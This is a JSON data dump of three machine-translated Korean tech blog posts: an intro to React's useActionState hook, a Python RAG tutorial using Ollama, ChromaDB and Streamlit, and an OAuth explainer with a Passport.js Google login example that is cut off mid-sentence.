{"pageProps":{"posts":[{"title":"useActionState  React의 새로운 Hook ","description":"","date":"2024-06-30 18:33","slug":"2024-06-30-useActionStateANewHookinReact","content":"\n\n<img src=\"/assets/img/2024-06-30-useActionStateANewHookinReact_0.png\" />\n\n안녕하세요 개발자 여러분 👋, 저는 Md Taqui Imam입니다. 오늘은 React의 새로운 흥미로운 훅인 useActionState에 대해 설명하려고 합니다.\n\n## useActionState란 무엇인가요?\n\nuseActionState는 폼 작업의 결과에 기반하여 상태를 업데이트하는 데 도움을 주는 새로운 React 훅입니다.\n\n<div class=\"content-ad\"></div>\n\n우리를 위해 기억하고 양식을 제출할 때 변경할 수 있는 스마트 도우미 같아요.\n\n공식 문서를 확인해보세요🚀\n\n## useActionState를 사용하는 방법은?\n\n이 훅을 사용하려면 먼저 React에서 가져와야 합니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nimport { useActionState } from 'react';\n```\n\n이제, 우리는 컴포넌트에서 다음과 같이 사용할 수 있어요:\n\n```js\nconst [state, formAction] = useActionState(actionFunction, initialState);\n```\n\n여기서 각 부분이 의미하는 바입니다:\n\n<div class=\"content-ad\"></div>\n\n- ‘state’은 현재 양식 상태입니다.\n- ‘formAction’은 양식에서 사용할 새로운 액션입니다.\n- ‘actionFunction’은 양식을 제출할 때 실행되는 함수입니다.\n- ‘initialState’은 상태의 초기값입니다.\n\n## useActionState를 사용하는 시기:\n\n이 훅을 사용하면 서버 구성 요소를 사용하며 더 빠른 응답을 원할 때 포르를 제출하여 상태를 업데이트할 때 사용하세요.\n\n예시:\n\n<div class=\"content-ad\"></div>\n\n간단한 카운터 양식을 useActionState를 사용하여 만들어봅시다:\n\n```js\nimport { useActionState } from \"react\";\n\nasync function increment(previousState, formData) {\n  return previousState + 1;\n}\n\nfunction StatefulForm() {\n  const [state, formAction] = useActionState(increment, 0);\n  return (\n    <form>\n      {state}\n      <button formAction={formAction}>Increment</button>\n    </form>\n  );\n}\n```\n\n이 예시에서 우리가 버튼을 클릭할 때마다 숫자가 하나씩 증가합니다. useActionState 훅이 양식이 제출될 때마다 상태를 업데이트하는 것을 관리해줘요.\n\n## 이게 전부에요 😅\n\n<div class=\"content-ad\"></div>\n\n기억하세요! 배우는 가장 좋은 방법은 경험하는 것입니다.\n\n그래서 useActionState가 보다 널리 사용 가능해지면, 여러분의 프로젝트에서 사용해보세요. 어떻게 양식을 개선할 수 있는지 확인해 보세요!\n\n코딩 즐기세요!\n\n[사진](/assets/img/2024-06-30-useActionStateANewHookinReact_1.png)","ogImage":{"url":"/assets/img/2024-06-30-useActionStateANewHookinReact_0.png"},"coverImage":"/assets/img/2024-06-30-useActionStateANewHookinReact_0.png","tag":["Tech"],"readingTime":2},{"title":"파이썬으로 GenAI 개발하기 최신 LLM과 RAG 완벽 튜토리얼","description":"","date":"2024-06-30 18:30","slug":"2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial","content":"\n\n<img src=\"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_0.png\" />\n\n이 기사에서는 개인 문서에서 지식을 효과적으로 학습하고 질문에 대답할 수 있는 간단한 AI를 구축하는 방법을 보여드리겠습니다.\n\n<img src=\"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_1.png\" />\n\n## 소개\n\n<div class=\"content-ad\"></div>\n\n자연어 처리(NLP)는 기계와 인간 언어 간의 상호작용을 연구하는 인공 지능 분야입니다. 지금까지 NLP의 정점은 거대한 양의 텍스트 데이터로 훈련된 대형 언어 모델(LLM)의 등장이었습니다. LLM은 언어 패턴과 변형을 학습할 수 있는 능력을 갖추고 있습니다. \"언어 모델\"이라는 용어는 딥 러닝과 신경망의 발전과 함께 흔해졌습니다. 특히 2018년 구글이 Transformer 기반 아키텍처를 소개한 후에는 NLP 모델의 성능이 크게 향상되었습니다.(구글의 BERT 및 OpenAI의 GPT).\n\n오늘날 LLM은 일반적으로 텍스트 간 작업 또는 \"텍스트 생성\"(즉, 번역, 요약, 챗봇 및 가상 비서, 심지어 전체 책 작성)에 사용됩니다. 이를 통해 우리는 새로운 콘텐츠(텍스트, 이미지, 오디오, 비디오 등) 작성에 초점을 맞춘 산업 분야인 생성적 인공지능(GenAI)의 부상을 목격하고 있습니다.\n\n최신 LLM 풍경:\n\n- OpenAI의 ChatGPT, 가장 많이 사용됨 (여기서 시도해보기)\n- Anthropic의 Claude(여기서 시도해보기)\n- Google의 Gemini(여기서 시도해보기)\n- Meta의 Llama(여기서 시도해보기)\n- Microsoft의 Phi, 사용 가능한 모델 중 가장 작은 모델로 GPU 없이도 노트북에서 실행 가능(여기서 시도해보기)\n- StabilityAI의 StableLM\n- Cohere의 CommandR(여기서 시도해보기)\n- Snowflake의 Arctic(여기서 시도해보기)\n- Alibaba의 Qwen(여기서 시도해보기)\n- 01AI의 Yi\n- X의 Grok\n- NVIDIA의 Megatron\n- 아마존의 Olympus(아직 출시 예정)\n- Apple의 MM1(아직 출시 예정)\n\n<div class=\"content-ad\"></div>\n\nChatGPT은 가장 일반적으로 사용되는 LLM입니다. 그러나 회사들은 그것으로 업로드하기 어려운 문제가 있습니다. (대부분은 개인 정보 및 보안 상의 이유로) OpenAI에 민감한 데이터를 업로드할 수 없습니다. 따라서 회사들은 비공개 지식베이스에서 LLM의 파워를 활용하기 위해 내부 AI 서비스를 개발하고 있습니다. 이러한 종류의 작업을 검색 증강 생성(RAG)이라고 합니다. 이 기술은 외부 소스에서 가져온 지식 사실을 LLM에 추가하여 검색 및 생성 모델을 결합하는 방법입니다.\n\n조직 내에서, 지식 베이스는 일반적으로 다중 모달 콘텐츠(예: 텍스트, 이미지, 스프레드시트)를 포함한 문서로 구성되어 있으므로, 기계가 이해할 수 있도록 모든 것들을 처리하는 것이 가장 큰 도전입니다. 간단히 말해서, 먼저 모든 문서를 임베딩으로 변환한 다음 사용자 쿼리를 동일한 벡터 공간으로 변환하여 코사인 유사도 검색을 수행합니다.\n\n![이미지](/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_2.png)\n\n이 자습서에서는 GPU 없이 일반 노트북에서 실행 가능한 LLMs 및 다중 모달 데이터를 사용하여 RAG 앱을 만들 것입니다. 다른 유사한 경우에 쉽게 적용할 수 있는 유용한 Python 코드 몇 가지를 제시하고 있으며 (그저 복사하여 붙여넣기하고 실행하면 됩니다), 각 코드 라인에 대한 설명을 포함하여 이 예제를 복제할 수 있도록 안내할 것입니다 (전체 코드에 대한 링크는 아래에 있습니다).\n\n<div class=\"content-ad\"></div>\n\n특히 다음을 살펴볼 것입니다:\n\n- 설정: Pdf2image로 데이터 가져오기, PyTesseract로 OCR 처리하기.\n- 전처리: Ollama를 사용하여 LLM으로 데이터를 보강하기.\n- 데이터베이스: ChromaDB로 데이터를 벡터로 저장하고 쿼리하기.\n- 백엔드: Ollama를 사용하여답변 생성하기.\n- 프론트엔드: Streamlit으로 사용자가 AI와 상호작용할 수 있는 인터페이스 구축하기.\n\n## 설정\n\n현실 세계에서 회사들은 대부분의 문서를 공유하기 전에 해당 형식으로 변환하는 PDF를 광범위하게 사용합니다. 또한 이미지, 테이블, 텍스트가 포함된 문서들이 많이 있어 좋은 사용 사례를 나타냅니다. 따라서 이 예제에서는 PDF 형식의 공개 회사의 재무 보고서를 데이터셋으로 사용할 것입니다.\n\n<div class=\"content-ad\"></div>\n\n![이미지](/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_3.png)\n\nPDF 문서를 처리하는 두 가지 대안적 방법이 있습니다: 텍스트로 읽거나 이미지로 구문 분석합니다. 둘 다 사용 사례에 따라 다르기 때문에 완벽하지는 않지만, OCR (광학 문자 인식) 기능이 더 잘 작동하는 경향이 있으므로 이를 사용하겠습니다.\n\n이 기사의 초점이 OCR에 있지는 않으며, 작동 방식에 대해 자세히 설명하는 데 너무 많은 시간을 할애하지는 않을 것입니다. 만약 해당 주제를 깊이 파고들고 싶다면, 이 기사를 확인하고 LayoutParser와 Unstructured 같은 고급 OCR 라이브러리를 사용해 보세요.\n\n우선 문서를 이미지로 변환해야 합니다:\n\n<div class=\"content-ad\"></div>\n\n\n# conda install -c conda-forge poppler\nimport pdf2image #1.17.0\n\ndoc_img = pdf2image.convert_from_path(\"data/doc_nvidia.pdf\", dpi=300)\n\n# 예시로 한 페이지 출력\ndoc_img[35]\r\n\n\n<img src=\"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_4.png\" />\n\n그런 다음, 페이지(이미지)에서 텍스트를 인식하겠습니다. 이를 위해 HP에서 1985년에 만들어진 주요 OCR 시스템 Tesseract를 사용하고 있으며 현재 Google에서 개발 중에 있습니다.\n\n\nimport pytesseract #0.3.10\n\ndoc_txt = []\nfor page in doc_img:\n    text = pytesseract.image_to_string(page)\n    doc_txt.append(text)\n\ndoc_txt[35]\r\n\n\n<div class=\"content-ad\"></div>\n\n![2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_5.png](/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_5.png)\n\n이제 우리는 생 텍스트를 가지고 있으니, 무엇보다 처리를 해야 할 것입니다. 우리는 언어 모델을 사용할 것입니다. 현재 여러 가지 대체 라이브러리들이 있어서 LLM의 힘을 활용할 수 있습니다: Ollama, HuggingFace, DSPy, LangChain. 제가 사용하는 Ollama는 강력하면서 사용하기 쉽습니다.\n\n먼저, 웹사이트에서 프로그램을 다운로드해야 합니다. 그런 다음, 명령 프롬프트에서 아래 명령을 입력하여 노트북에서 LLM을 실행합니다 (저는 Phi3와 LLaVa를 사용하고 있습니다):\n\n![2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_6.png](/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_6.png)\n\n<div class=\"content-ad\"></div>\n\n마지막으로, Python 라이브러리를 설치하면 끝입니다 (pip install ollama).\n\n## 전처리\n\n어떤 데이터 과학 프로젝트든 마찬가지로, 언제나 가장 어려운 부분은 데이터셋입니다. 머신러닝을 얼마나 많이 사용하더라도 데이터가 좋지 않다면 AI가 제대로 작동하지 않을 것입니다.\n\nLLM(대형 언어 모델)의 경우, 임베딩이 포함되어 있기 때문에 표준 플랙티스는 모든 것을 텍스트로 변환하는 것입니다. 가장 일반적인 다중모달 콘텐츠 (텍스트, 테이블, 이미지, 플롯)의 처리 방법을 보여드리겠습니다.\n\n<div class=\"content-ad\"></div>\n\n텍스트 — 문서는 서로 다른 구조와 레이아웃을 가질 수 있기 때문에 데이터 세트를 단락으로 분할해야 합니다. 원시 텍스트 외에도 제목, 태그, 링크와 같은 추가 정보를 활용하여 데이터를 보강할 수 있습니다. 이를 메타데이터 보강이라고 합니다.\n\n```js\n# 목차를 사용하여 단락에 태그 지정하기\ntitle_map = {\n    \"4-12\":\"비즈니스\",\n    \"13-33\":\"위험 요인\",\n    \"34-44\":\"재무\",\n    \"45-46\":\"이사\",\n    \"47-83\":\"데이터\"\n}\n\nlst_docs, lst_ids, lst_metadata = [], [], []\nfor n,page in enumerate(doc_txt):\n    try:\n        ## 제목 가져오기\n        title = [v for k,v in title_map.items() \n                 if n in range(int(k.split(\"-\")[0]), \n                               int(k.split(\"-\")[1])+1)][0]\n        ## 페이지 정리\n        page = page.replace(\"Table of Contents\",\"\")\n        ## 단락 가져오기\n        for i,p in enumerate(page.split('\\n\\n')):\n            if len(p.strip())>5:  ##<--단락 정리\n                lst_docs.append(p.strip())\n                lst_ids.append(str(n)+\"_\"+str(i))\n                lst_metadata.append({\"title\":title})\n    except:\n        continue\n\n\n## 예시 출력\nfor id,doc,meta in zip(lst_ids[375:378], \n                       lst_docs[375:378], \n                       lst_metadata[375:378]):\n    print(id, \"-\", meta, \"\\n\", doc, \"\\n\")\r\n```\n\n<img src=\"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_7.png\" />\n\n언어 모델을 사용한 메타데이터 보강은 문서 검색을 크게 향상시킬 수 있습니다. 예를 들어, 각 단락을 몇 가지 키워드로 요약하는 데 Phi3를 사용할 예정입니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nimport ollama #0.2.1\n\ndef keyword_generator(p, top=3):\n    prompt = \"다음 단락을 3개의 키워드로 요약해주세요, 각각 ,로 구분: \"+p\n    res = ollama.generate(model=\"phi3\", prompt=prompt)[\"response\"]\n    return res.replace(\"\\n\",\" \").strip()\n\n\n## test\np = '''Professional artists, architects and designers use NVIDIA partner products accelerated with our GPUs and software platform for a range of creative and design\nuse cases, such as creating visual effects in movies or designing buildings and products. In addition, generative Al is expanding the market for our workstation-\nclass GPUs, as more enterprise customers develop and deploy Al applications with their data on-premises.'''\nprint(keyword_generator(p))\n```\n\n결과: “창의적 디자인, NVIDIA 파트너십, AI 확장”. 위와 같이 모든 단락에 적용하겠습니다:\n\n```js\nfrom tqdm.notebook import tqdm\n\nfor i,doc in tqdm(enumerate(lst_docs)):\n    lst_metadata[i][\"keywords\"] = keyword_generator(doc)\n\n## 예시 출력\nfor id,doc,meta in zip(lst_ids[375:378], \n                       lst_docs[375:378], \n                       lst_metadata[375:378]):\n    print(id, \"-\", meta, \"\\n\", doc, \"\\n\")\n```\n\n<img src=\"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_8.png\" />\n\n<div class=\"content-ad\"></div>\n\nTABLES - LLM(Large Language Model)는 순차 텍스트를 현저한 정확도로 처리할 수 있는 것으로 잘 알려져 있습니다. 그러나 이제 구조화된 데이터도 이해하기 시작했기 때문에 테이블은 일반 텍스트로 전달될 수 있습니다. 이를 다시 한번 확인해보겠습니다:\n\n```js\ntable = lst_docs[376]\nprint(\"테이블:\\n\", table)\n\nprompt = f\"다음 테이블을 요약해주세요: {table}\"\nres = ollama.generate(model=\"phi3\", prompt=prompt)[\"response\"]\n\nprint(\"\\n요약:\\n\", res)\n```\n\n![이미지](/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_9.png)\n\n이미지 - 이미지의 임베딩은 상당히 까다로울 수 있습니다(3D 배열의 차원을 벡터로 축소해야 함). 따라서 일반적인 실천 방법은 이미지를 설명하는 캡션을 생성하기 위해 AI를 사용하고 가능한 경우 정보를 텍스트로 처리하는 것입니다.\n\n<div class=\"content-ad\"></div>\n\n```python\nfrom matplotlib import image, pyplot\n\nimage_file = \"data/image.jpeg\"\n\npyplot.imshow(image.imread(image_file))\npyplot.show()\n```\n\n![image](/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_10.png)\n\nLLM을 위해 이미지를 문자열로 변환해야 합니다:\n\n```python\n## 이미지를 base64 문자열로 인코딩\nimport base64\n\ndef encode_image(path):\n    with open(path, \"rb\") as file:\n        return base64.b64encode(file.read()).decode('utf-8')\n\nimg = encode_image(image_file)\nimg[:1000]\n```\n\n<div class=\"content-ad\"></div>\n\n아래는 테이블 태그를 Markdown 형식으로 변경한 예시입니다.\n\n\n<img src=\"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_11.png\" />\n\n모델에 이미지 설명을 요청하는 문자열을 전달할 수 있습니다. 안타깝게도 Phi3은 시각 모델이 아니기 때문에 이 작업에 적합하지 않습니다:\n\n```js\nprompt = \"이미지를 설명해주세요\"\nres = ollama.generate(model=\"phi3\", prompt=prompt, images=[img])[\"response\"]\nprint(res)\n```\n\n<img src=\"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_12.png\" />\n\n\n<div class=\"content-ad\"></div>\n\n따라서 적절한 시각 모델을 구해야 합니다. Microsoft의 LLaVa는 GPU 없이도 실행할 수 있어 효율적인 선택입니다 (여기에서 시도해 보세요).\n\n```js\n## LLaVA\nprompt = \"이미지를 설명해주세요\"\nres = ollama.generate(model=\"llava\", prompt=prompt, images=[img])[\"response\"]\nprint(res)\n```\n\n<img src=\"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_13.png\" />\n\nPLOTS — 이미지와 마찬가지로, 시각 모델은 플롯/차트를 읽고 요약할 수 있지만 결과가 정확하지는 않습니다. 예를 살펴보겠습니다:\n\n<div class=\"content-ad\"></div>\n\n```js\n이미지_파일 = \"data/plot.png\"\n\npyplot.imshow(image.imread(image_file))\npyplot.show()\n\nimg = encode_image(image_file)\n\nprompt = \"그래프와 같은 그림에 대해 구체적으로 설명해주세요.\"\nres = ollama.generate(model=\"llava\", prompt=prompt, images=[img])[\"response\"]\nprint(res)\n```\n\n<img src=\"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_14.png\" />\n\n## 데이터베이스\n\n우리는 데이터를 벡터 데이터베이스에 저장할 수 있습니다. 이는 비구조적 데이터를 효율적으로 저장하고 색인화하고 검색하는 가장 좋은 해결책입니다. 요즘 가장 많이 사용되는 벡터 데이터베이스는 Microsoft의 AISearch입니다. 최고의 오픈 소스 도구는 유용하고 쉽고 무료인 ChromaDB입니다.\n\n<div class=\"content-ad\"></div>\n\n빠르게 \"pip install chromadb\"를 입력하면 Python을 사용하여 세 가지 다른 방법으로 db와 상호 작용할 수 있습니다:\n\n- chromadb.Client()는 디스크 공간을 차지하지 않고 메모리에 일시적으로 유지되는 db를 만듭니다.\n- chromadb.PersistentClient(path)는 로컬 기계에서 db를 저장하고 로드합니다.\n- chromadb.HttpClient(host='localhost', port=8000)는 브라우저에서 클라이언트-서버 모드를 사용할 수 있습니다.\n\nChromaDB에 문서를 저장할 때 데이터는 벡터로 저장되어 일치하는 레코드를 검색할 때 쿼리 벡터를 사용할 수 있습니다. 참고로, 그렇게 명시하지 않으면 기본 임베딩 방법은 문장 변환 모델 (all-MiniLM-L6-v2)입니다.\n\n```js\nimport chromadb #0.5.0\n\ndb = chromadb.PersistentClient()\n\ncollection_name = \"nvidia\"\ncollection = db.get_or_create_collection(name=collection_name, \n               embedding_function=chromadb.utils.embedding_functions.DefaultEmbeddingFunction())\n\ncollection.add(documents=lst_docs, ids=lst_ids, metadatas=lst_metadata, \n               images=None, embeddings=None)\ncollection.peek(1)\n```\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_15.png\" />\n\n어떤 것을 쿼리해보세요:\n\n```js\nquery = \"수익은 얼마인가요?\"\ncollection.query(query_texts=[query])\n```\n\n<img src=\"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_16.png\" />\n\n<div class=\"content-ad\"></div>\n\n쿼리가 동일한 벡터 공간에 포함되어 있고 ChromaDB가 가장 가까운 문서를 검색했습니다. 그들을 결합해서 db에서 최종 응답을 얻을 수 있습니다:\n\n```js\nres_db = collection.query(query_texts=[query])[\"documents\"][0][0:10]\ncontext = ' '.join(res_db).replace(\"\\n\", \" \")\ncontext\n```\n\n![이미지](/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_17.png)\n\ndb 응답은 컨텍스트로 사용될 수 있으며, 이는 LLM이 저장하고 액세스할 수 있는 소량의 정보 세트입니다. 프롬프트를 사용하여 모델이 컨텍스트 내 정보만 사용할지 훈련 중에 학습한 지식도 사용해야 하는지 지정할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n```js\n# Context만으로 대화하기\nres = ollama.chat(model=\"phi3\", \n                  messages=[{\"role\":\"system\", \"content\":\"다음 정보만을 사용하여 가장 정확한 답변을 제공하세요: \\n\"+context},\n                            {\"role\":\"user\", \"content\":query}])\nprint(res[\"message\"][\"content\"])\n```\n\n![이미지](/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_18.png)\n\n또는 모델의 지식을 추가하여:\n\n```js\n# 지식 및 Context로 대화하기\nres = ollama.chat(model=\"phi3\", \n                  messages=[{\"role\":\"system\", \"content\":\"귀하의 지식과 다음 추가 정보를 사용하여 가장 정확한 답변을 제공하세요: \\n\"+context},\n                            {\"role\":\"user\", \"content\":query}])\nprint(res[\"message\"][\"content\"])\n``` \n\n\n<div class=\"content-ad\"></div>\n\n\n![Image](/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_19.png)\n\n데이터베이스가 설정되어 정상적으로 작동 중입니다. 다음 단계로 진행하여 문서에 관한 질문을 할 수 있는 챗봇 앱을 만들 수 있습니다.\n\n## 프론트엔드\n\n요즘 가장 많이 사용되는 Python 라이브러리인 Streamlit은 NLP 애플리케이션 개발을 간편하게 만들어주는 스트리밍 기능으로 알려져 있습니다.\n\n\n<div class=\"content-ad\"></div>\n\n시작하기 전에 먼저 레이아웃을 정의해 봅시다: 화면에는 사용자가 채팅 기록을 볼 수 있는 사이드바가 있기를 원합니다.\n\n```python\nimport streamlit as st #1.35.0\n\n## 레이아웃\nst.title('💬 궁금한 점을 적어주세요')\nst.sidebar.title(\"채팅 기록\")\napp = st.session_state\n\nif \"messages\" not in app:\n    app[\"messages\"] = [{\"role\":\"assistant\", \"content\":\"정보를 검색할 준비가 되어 있습니다.\"}]\n\nif 'history' not in app:\n    app['history'] = []\n\nif 'full_response' not in app:\n    app['full_response'] = '' \n```\n\n앱 객체(또는 session_state)는 다음과 같은 구조를 갖는 딕셔너리입니다:\n\n![이미지](/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_20.png)\n\n<div class=\"content-ad\"></div>\n\n만약 채팅에서 메시지가 사라지는 것을 원하지 않는다면, 다음 코드를 추가하세요:\n\n```js\n## 채팅 메시지 유지\nfor msg in app[\"messages\"]:\n    if msg[\"role\"] == \"user\":\n        st.chat_message(msg[\"role\"], avatar=\"😎\").write(msg[\"content\"])\n    elif msg[\"role\"] == \"assistant\":\n        st.chat_message(msg[\"role\"], avatar=\"👾\").write(msg[\"content\"])\n```\n\n이제 채팅 코어를 코드화해야 합니다: 사용자의 질문은 메시지 목록에 추가되어 AI로 전달되고, 앱은 응답을 스트리밍할 것입니다.\n\n```js\n## 채팅\nif txt := st.chat_input():\n    ### 사용자 입력\n    app[\"messages\"].append({\"role\":\"user\", \"content\":txt})\n    st.chat_message(\"user\", avatar=\"😎\").write(txt)\n\n    ### AI가 채팅 스트림으로 응답\n    app[\"full_response\"] = \"\"\n    st.chat_message(\"assistant\", avatar=\"👾\").write_stream( xxx ) )\n    app[\"messages\"].append({\"role\":\"assistant\", \"content\":app[\"full_response\"]})\n    \n    ### 사이드바 히스토리 보여주기\n    app['history'].append(\"😎: \"+txt)\n    app['history'].append(\"👾: \"+app[\"full_response\"])\n    st.sidebar.markdown(\"<br />\".join(app['history'])+\"<br /><br />\", unsafe_allow_html=True)\n```\n\n<div class=\"content-ad\"></div>\n\n우리는 사용자 질문에 응답하는 기능을 완성한 후 \"xxx\"로 대체할 자리 표시자를 삽입했습니다. 앱을 실행하면 다음과 같이 보입니다:\n\n![앱 실행 화면](/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_21.png)\n\n## 백엔드\n\n우리는 이미 이 부분에 익숙합니다. 이것을 클래스 내에 넣기만 하면 됩니다. 강조할 몇 가지 포인트가 있습니다:\n\n<div class=\"content-ad\"></div>\n\n- ChromaDB에서 컬렉션 이름을 호출하면, 이미 존재하는 경우 db는 새로 만들지 않고 \"가져오게\" 됩니다.\n- Ollama 채팅 기능의 스트리밍 매개변수는 (stream=True)로 전환하여 완전한 응답 대신 텍스트 청크를 반환합니다.\n- LLM을 호출할 때마다 이전 메시지에 대한 참조를 이해할 수 있도록 전체 채팅 기록을 입력으로 전달합니다.\n\n```js\nimport chromadb #0.5.0\nimport ollama  #0.5.0\n\nclass AI():\n def __init__(self):\n  db = chromadb.PersistentClient()\n  self.collection = db.get_or_create_collection(\"nvidia\")\n\n def query(self, q, top=10):\n  res_db = self.collection.query(query_texts=[q])[\"documents\"][0][0:top]\n  context = ' '.join(res_db).replace(\"\\n\", \" \")\n  return context\n\n def respond(self, lst_messages, model=\"phi3\", use_knowledge=False):\n  q = lst_messages[-1][\"content\"]\n  context = self.query(q)\n\n  if use_knowledge:\n   prompt = \"Give the most accurate answer using your knowledge and the folling additional information: \\n\"+context\n  else:\n   prompt = \"Give the most accurate answer using only the folling information: \\n\"+context\n\n  res_ai = ollama.chat(model=model, \n        messages=[{\"role\":\"system\", \"content\":prompt}]+lst_messages,\n                      stream=True)\n  for res in res_ai:\n   chunk = res[\"message\"][\"content\"]\n   app[\"full_response\"] += chunk\n   yield chunk\n\nai = AI()\n```\n\nStreamlit 앱을 실행하려면 다음 명령을 사용해야 합니다: streamlit run rag_app.py\n\n<img src=\"https://miro.medium.com/v2/resize:fit:1400/1*C722wXvi4JCn3OrN8TbLLA.gif\" />\n\n<div class=\"content-ad\"></div>\n\n## 결론\n\n본 글은 Python과 LLMs를 사용하여 RAG 앱을 만드는 방법을 보여주는 튜토리얼이었습니다. 우리는 언어 모델을 사용하여 멀티모달 콘텐츠를 처리하고, 그 데이터를 벡터 데이터베이스에 저장했습니다. ChatGPT와 비슷한 AI가 우리의 질문에 답변할 때 사용하는 데이터베이스입니다. 마지막으로 모델과 채팅할 수 있는 사용자 친화적인 인터페이스를 만들었습니다.\n\n즐겁게 즐겼으면 좋겠습니다! 질문이나 피드백이 있으시면 언제든지 저에게 연락해 주시거나 귀하의 흥미로운 프로젝트를 공유해 주세요.","ogImage":{"url":"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_0.png"},"coverImage":"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_0.png","tag":["Tech"],"readingTime":16},{"title":"OAuth는 삶을 쉽게 만들어 준다 사용 방법, 이점 및 실전 예제","description":"","date":"2024-06-30 18:28","slug":"2024-06-30-OAuthMakesLifeEasy","content":"\n\n저와 같이 기술의 발전으로 게으를 갖고 있는 분이세요? 솔직히 말씀드리자면, 스트레스 받을 건 전혀 가망이 없죠. 보안은 기술에서 매우 중요한 측면이며, 진지하게 고려해야 합니다. 그러나 솔직히 말해요, 우리 중 얼마나 많은 사람들이 안전한 암호를 생성하고 안전하게 보관하는 필요한 단계를 취하는 것을 선호할까요? 이 세대의 기술 사용자들은 그래 할 만큼 게으르죠.\n\n이전에 사람들이 일반적으로 했던 방식은 하나의 강력한 암호를 생성하여 모든 웹 사이트에 사용하는 것이었습니다. 그러나 한 사이트가 침해당한다면, 암호가 노출됩니다. 중요한 사람인 경우, 해커들은 그를 활용하여 소셜 미디어에 로그인할 수 있습니다. 만약 은행 앱에도 같은 암호를 사용하는 무모한 짓을 하려한다면? — \"Otilor\"(요르바어로 \"사라졌거나 망했다\"는 뜻)입니다.\n\n그렇다면, 저와 같이 게으른 사람들에게 좋은 대안은 무엇일까요? 그 대답은 OAuth(Open Authorization)입니다.\n\nOAuth(Open Authorization)란 무엇인가요?\n\n<div class=\"content-ad\"></div>\n\nOAuth은 Google, Facebook 또는 GitHub과 같은 신뢰할 수 있는 플랫폼을 사용하여 인증할 수 있도록 합니다. 이러한 대표적인 사이트들은 보안에 수십억을 투자하고 있습니다. 만약 해커가 Google 또는 Facebook을 성공적으로 해킹할 수 있다면, 나의 계정을 해킹해도 된다고 생각할 수도 있겠지만, 그건 농담이에요. 하지만 사실은 이들에게 우리의 보안을 맡길 수 있다는 것이죠. 그래서 내가 해야 할 일은 구글에 로그인하는 것 뿐이에요. 적어도 그건 하나의 비밀번호일 뿐이니까, 이건 안전하게 지킬 수 있어야겠죠.\n\n구글, Facebook 또는 GitHub에 로그인한 후, 다른 웹사이트에게 내 이름, 프로필 사진 및 계정에서 사용 가능한 기타 정보와 같은 몇 가지 사용자 정보에 대한 접근 권한을 부여할 수 있어요. 이렇게 하면 해당 웹사이트가 나의 인증을 수행할 수 있어요.\n\nOAuth 유형\n\n더 나아가기 전에, Open Authorization에는 OAuth 1.0과 OAuth 2.0 두 가지 유형이 있다는 것을 간략히 언급하고 싶어요. 오늘날 가장 일반적으로 사용되는 버전인 OAuth 2.0은 더 간단하고 유연성이 더 높은 기능을 제공합니다.\n\n<div class=\"content-ad\"></div>\n\n테이블 태그를 Markdown 형식으로 변경해주세요.\n\n<div class=\"content-ad\"></div>\n\n2. 필요한 npm 패키지를 설치해주세요:\n\n\nnpm install express passport passport-google-oauth20 express-session\n\n\n3. index.js 파일을 만들고 Express 애플리케이션을 설정해주세요:\n\n```javascript\nconst express = require('express');\nconst passport = require('passport');\nconst GoogleStrategy = require('passport-google-oauth20').Strategy;\nconst session = require('express-session');\n```\n\n<div class=\"content-ad\"></div>\n\n```javascript\nconst app = express();\n\napp.use(session({\n    secret: 'your_secret_key', // Replace with a secure key\n    resave: false,\n    saveUninitialized: true\n}));\n\napp.use(passport.initialize());\napp.use(passport.session());\n\n// Configure Passport to use Google OAuth\npassport.use(new GoogleStrategy({\n    clientID: 'YOUR_GOOGLE_CLIENT_ID',\n    clientSecret: 'YOUR_GOOGLE_CLIENT_SECRET',\n    callbackURL: 'http://localhost:3000/auth/google/callback'\n},\nfunction(token, tokenSecret, profile, done) {\n    return done(null, profile);\n}));\n```\n\n<div class=\"content-ad\"></div>\n\n```javascript\npassport.serializeUser((user, done) => {\n  done(null, user);\n});\n\npassport.deserializeUser((obj, done) => {\n  done(null, obj);\n});\n\n// Define routes\napp.get('/auth/google',\n  passport.authenticate('google', { scope: ['profile'] }));\n\napp.get('/auth/google/callback',\n  passport.authenticate('google', { failureRedirect: '/' }),\n  (req, res) => {\n    res.redirect('/');\n  });\n```\n\n<div class=\"content-ad\"></div>\n\n\napp.get('/', (req, res) => {\n  res.send(`<h1>Home</h1><a href=\"/auth/google\">Login with Google</a>`);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});\n\n4. Start your Node.js server with “node index.js”. Open your browser and go to http://localhost:3000. Click on \"Login with Google\" to start the OAuth 